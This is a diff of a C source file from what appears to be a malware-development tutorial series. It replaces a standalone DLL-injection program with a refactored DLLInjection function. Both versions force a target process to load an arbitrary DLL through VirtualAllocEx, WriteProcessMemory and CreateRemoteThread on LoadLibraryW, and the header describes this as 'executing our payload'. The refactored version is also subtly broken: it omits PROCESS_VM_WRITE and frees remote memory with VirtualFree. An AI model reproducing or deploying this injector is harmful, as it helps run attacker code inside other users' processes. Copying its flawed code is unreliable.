@@ -1,105 +1,130 @@
-/*------------------------------------------------------------------------------------------------------
-@author     crow
-@brief      force a process to load a dll which when loaded, will run DllMain; executing our payload
-@site       https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection
-------------------------------------------------------------------------------------------------------*/
+#include "injection.h"
 
-#include <windows.h>
-#include <stdio.h>
+//---------------------------------------------------------------------------------
 
-#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
-#define warn(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)
-#define info(msg, ...) printf("[i] " msg "\n", ##__VA_ARGS__)
+VOID PrettyFormat(
+        _In_ LPCSTR FunctionName,
+        _In_ CONST DWORD ErrorStatus
+        ) {
 
-int main(int argc, char* argv[]) {
+    if (NULL == FunctionName || 0 == ErrorStatus) {
+        WARN("either you didn't supply a function name"
+                "or the function actually returned successfully");
+    }
 
-	/*------[SETUP SOME VARIABLES]------*/
-	DWORD       TID               = 0;
-	DWORD       PID               = 0;
-	LPVOID      rBuffer           = NULL;
-	HANDLE      hProcess          = NULL;
-	HANDLE      hThread           = NULL;
-	HMODULE     hKernel32         = NULL;
-	wchar_t     dllPath[MAX_PATH] = L"C:\\path\\to\\crow.dll";
-	SIZE_T      pathSize          = sizeof(dllPath);
-	SIZE_T      bytesWritten      = 0;
+    WARN("[%s] failed, error: 0x%lx", FunctionName, ErrorStatus);
+    return;
 
-	/*------[GET HANDLE TO PROCESS]------*/
-	if (argc < 2) {
-		warn("usage: %s <PID>", argv[0]);
-		return EXIT_FAILURE;
-	}
+}
 
-	PID = atoi(argv[1]);
+//---------------------------------------------------------------------------------
 
-	info("trying to get a handle to the process (%ld)...", PID);
-	hProcess = OpenProcess((PROCESS_VM_OPERATION | PROCESS_VM_WRITE), FALSE, PID);
-	if (hProcess == NULL) {
-		warn("unable to get a handle to the process (%ld), error: 0x%lx", PID, GetLastError());
-		return EXIT_FAILURE;
-	}
-	okay("got a handle to the process!");
-	info("\\___[ hProcess\n\t\\_0x%p]\n", hProcess);
+BOOL DLLInjection(
+        _In_ DWORD ProcessId,
+        _In_ LPCWSTR DLLPath,
+        _In_ SIZE_T DLLPathSize 
+        ) { 
 
-	/*------[GET HANDLE TO KERNEL32]------*/
-	info("getting handle to Kernel32.dll");
-	hKernel32 = GetModuleHandleW(L"kernel32");
-	if (hKernel32 == NULL) {
-		warn("failed to get a handle to Kernel32.dll, error: 0x%lx", GetLastError());
-		return EXIT_FAILURE;
-	}
-	okay("got a handle to Kernel32.dll");
-	info("\\___[ hKernel32\n\t\\_0x%p]\n", hKernel32);
+    BOOL    STATE          = TRUE;
+    PVOID   RemoteBuffer   = NULL;
+    HANDLE  ThreadHandle   = NULL;
+    HANDLE  ProcessHandle  = NULL;
+    HMODULE Kernel32Handle = NULL;
+    SIZE_T  BytesWritten   = 0;
 
-	/*------[GET ADDR OF LOADLIBRARY]------*/
-	info("getting address of LoadLibraryW()...");
-	LPTHREAD_START_ROUTINE kawLoadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryW");
-	okay("got address of LoadLibraryW()");
-	info("\\___[ LoadLibraryW\n\t\\_0x%p]\n", kawLoadLibrary);
+    if (NULL == DLLPath || 0 == DLLPathSize) {
+        WARN("DLL path's not set. exiting...");
+        return FALSE;
+    }
 
-	/*------[ALLOCATE A BUFFER]------*/
-	info("allocating memory in target process...");
-	rBuffer = VirtualAllocEx(hProcess, NULL, pathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
-	if (rBuffer == NULL) {
-		warn("couldn't allocate a buffer to the target process memory, error: 0x%lx", GetLastError());
-		goto CLEANUP;
-	}
-	okay("allocated buffer in target process memory [RW]");
+    INFO("supplied DLL: \"%S\"", DLLPath);
+    INFO("trying to get a handle on the process (%ld)...", ProcessId);
+    ProcessHandle = OpenProcess(
+            (PROCESS_VM_OPERATION | PROCESS_VM_OPERATION), 
+            FALSE, 
+            ProcessId
+            );
+    if (NULL == ProcessHandle){
+        PrettyFormat("OpenProcess", GetLastError());
+        return FALSE;
+    }
+    OKAY("[0x%p] got a handle on the process!", ProcessHandle);
 
-	/*------[WRITE TO MEMORY]------*/
-	info("writing to allocated buffer...");
-	WriteProcessMemory(hProcess, rBuffer, dllPath, pathSize, &bytesWritten);
-	okay("wrote %zu-bytes to the process memory", bytesWritten);
+    Kernel32Handle = GetModuleHandleW(L"Kernel32");
+    if (NULL == Kernel32Handle) {
+        PrettyFormat("GetModuleHandleW", GetLastError());
+        STATE = FALSE; goto CLEANUP;
+    }
+    OKAY("[0x%p] got a handle on Kernel32.dll!", Kernel32Handle);
 
-	/*------[CREATE A THREAD]------*/
-	info("creating a thread...");
-	hThread = CreateRemoteThread(hProcess, NULL, 0, kawLoadLibrary, rBuffer, 0, &TID); // lpParameter is set to rBuffer (holds the path to our dll) because LoadLibrary takes one argument (that being the path of the module you're trying to load) and this is how we supply that
-	if (hThread == NULL) {
-		warn("unable to create thread, error: 0x%lx", GetLastError());
-		goto CLEANUP;
-	}
-	okay("created a new thread in the target process! (%ld)", TID);
-	info("\\___[ hThread\n\t\\_0x%p]\n", hThread);
+    LPTHREAD_START_ROUTINE p_LoadLibraryW = (LPTHREAD_START_ROUTINE)GetProcAddress(
+            Kernel32Handle, "LoadLibraryW");
+    if (NULL == p_LoadLibraryW) {
+        WARN("failed to get the address of LoadLibraryW()");
+        STATE = FALSE; goto CLEANUP;
+    }
+    OKAY("[0x%p] got the address of LoadLibraryW()!", p_LoadLibraryW);
 
-	/*------[CLEANLY EXIT]------*/
-	info("waiting for thread to finish...");
-	WaitForSingleObject(hThread, INFINITE);
-	okay("thread finished execution");
-	goto CLEANUP;
+    RemoteBuffer = VirtualAllocEx(
+            ProcessHandle, 
+            NULL, 
+            DLLPathSize, 
+            (MEM_COMMIT | MEM_RESERVE), 
+            PAGE_READWRITE
+            );
+    if (NULL == RemoteBuffer) {
+        PrettyFormat("VirtualAllocEx", GetLastError());
+        STATE = FALSE; goto CLEANUP;
+    }
+    OKAY("[0x%p] [RW-] allocated a buffer with PAGE_READWRITE permissions.", RemoteBuffer);
+
+    WriteProcessMemory(
+            ProcessHandle, 
+            RemoteBuffer,
+            DLLPath, 
+            DLLPathSize, 
+            &BytesWritten 
+            );
+    OKAY("[0x%p] [RW-] wrote %zu-bytes to allocated buffer!", RemoteBuffer, DLLPathSize);
+
+    ThreadHandle = CreateRemoteThread(
+            ProcessHandle,
+            NULL,
+            0,
+            p_LoadLibraryW,
+            RemoteBuffer, /* argument for LoadLibrary() */
+            0,
+            0
+            );
+    if (NULL == ThreadHandle) {
+        PrettyFormat("CreateRemoteThread", GetLastError());
+        STATE = FALSE; goto CLEANUP;
+    }
+    OKAY("[0x%p] got a handle on the thread! waiting for it to finish execution...", ThreadHandle);
+
+    WaitForSingleObject(ThreadHandle, INFINITE);
+    INFO("[0x%p] thread finished execution! cleaning up...", ThreadHandle);
 
 CLEANUP:
 
-	if (hThread) {
-		info("closing handle to thread");
-		CloseHandle(hThread);
-	}
+    INFO("beginning cleanup...");
+    if (ThreadHandle) {
+        CloseHandle(ThreadHandle);
+        INFO("[0x%p] closed thread handle", ThreadHandle);
+    }
 
-	if (hProcess) {
-		info("closing handle to process");
-		CloseHandle(hProcess);
-	}
+    if (ProcessHandle) {
+        CloseHandle(ProcessHandle);
+        INFO("[0x%p] closed process handle", ProcessHandle);
+    }
 
-	okay("finished with house keeping, see ya :>");
-	return EXIT_SUCCESS;
+    if (RemoteBuffer) {
+        VirtualFree(RemoteBuffer, 0, MEM_RELEASE);
+        INFO("[0x%p] remote buffer freed", RemoteBuffer);
+    }
+
+    return STATE;
 
 }
+
+//---------------------------------------------------------------------------------
